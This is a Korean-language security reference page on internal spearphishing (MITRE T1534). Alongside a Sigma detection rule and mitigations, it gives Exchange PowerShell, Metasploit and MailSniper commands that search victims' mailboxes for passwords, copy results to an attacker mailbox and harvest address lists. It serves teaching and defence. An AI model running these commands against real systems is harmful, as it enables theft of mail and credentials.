# T1534 — Internal Spearphishing

## 개요

**TA0008 / T1534**  
이미 탈취한 내부 계정을 이용하여 내부 직원들에게 스피어피싱 이메일을 발송하는 기법입니다. 내부 계정에서 발송되므로 외부 스팸 필터를 우회하며, 수신자의 신뢰도가 높아 클릭률이 높습니다.

---

## 동작 방식

1. 내부 계정 탈취 (T1078 등 초기 접근 후)
2. 탈취한 계정의 이메일 히스토리, 연락처 분석
3. 신뢰 관계를 악용한 맞춤형 피싱 이메일 작성
4. 악성 첨부파일(.lnk, .iso, .hta, 매크로 문서) 또는 악성 링크 포함
5. 내부 수신자가 클릭 시 추가 시스템 감염

**내부 피싱의 특징:**
- 외부 스팸 필터 우회 (내부 발신)
- 발신자 신뢰도가 높아 클릭률 증가
- 이전 이메일 스레드에 답장 형식으로 삽입 가능 (Thread Hijacking)

---

## 주요 커맨드 / 실습

### Exchange PowerShell - 메일박스 탐색
```powershell
# Exchange PowerShell 모듈 연결
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn

# 전체 메일박스 목록
Get-Mailbox -ResultSize Unlimited | Select-Object DisplayName, PrimarySmtpAddress

# 특정 사용자의 수신 메일 검색 (민감 정보 탐색)
Get-MessageTrackingLog -Start "04/01/2024" -End "04/19/2024" -Sender "ceo@corp.local"

# 이메일 내용 검색
Search-Mailbox -Identity "target@corp.local" -SearchQuery "password OR secret OR confidential" -TargetMailbox "attacker@corp.local" -TargetFolder "Results" -LogLevel Full
```

### Meterpreter Exchange/Outlook 모듈
```ruby
# Meterpreter에서 Outlook 이메일 수집
use post/windows/gather/outlook
set SESSION 1
run

# Exchange 서버에서 이메일 덤프
use auxiliary/gather/exchange_internalntlm
set RHOSTS exchange.corp.local
run
```

### MailSniper - OWA 경유 이메일 수집
```powershell
# OWA를 통한 전체 이메일 다운로드
Invoke-SelfSearch -Mailbox current-user@corp.local -ExchHostname mail.corp.local -OutputCsv emails.csv

# 특정 키워드 검색
Invoke-SelfSearch -Mailbox current-user@corp.local -ExchHostname mail.corp.local -SearchTerm "password"

# 전역 주소록 수집
Get-GlobalAddressList -ExchHostname mail.corp.local -Username "user" -Password "pass" -OutFile gal.txt
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: Suspicious Email Attachment via Internal Sender
id: a9e4c7b2-5f3d-4e8a-b1c6-3d2f7e5b9a4c
status: experimental
description: Detects internal emails with suspicious attachment types
logsource:
    product: microsoft365
    service: exchange
detection:
    selection:
        EventID: 1
        AttachmentExtension|contains:
            - '.lnk'
            - '.iso'
            - '.hta'
            - '.vbs'
            - '.js'
    filter:
        SenderDomain|contains: 'external'
    condition: selection and not filter
falsepositives:
    - Legitimate IT communications with script files
level: medium
tags:
    - attack.lateral_movement
    - attack.t1534
```

---

## 대응 방안

1. 내부 이메일에도 첨부파일 샌드박스 스캔 적용
2. 위험 첨부파일 형식(.lnk, .iso, .hta, .vbs) 차단 정책
3. 이메일 이상 행위 탐지 (대량 발송, 비정상 수신자 패턴)
4. 탈취된 계정 조기 탐지를 위한 UEBA 적용
5. 직원 보안 교육 (내부 발신자도 의심)
6. 이메일 클라이언트에서 매크로 자동 실행 비활성화

---

## 참고자료
- [MITRE ATT&CK T1534](https://attack.mitre.org/techniques/T1534/)
- [MailSniper GitHub](https://github.com/dafthack/MailSniper)
- [Thread Hijacking 기법](https://www.proofpoint.com/us/blog/threat-insight/ta453-conversation-hijacking)
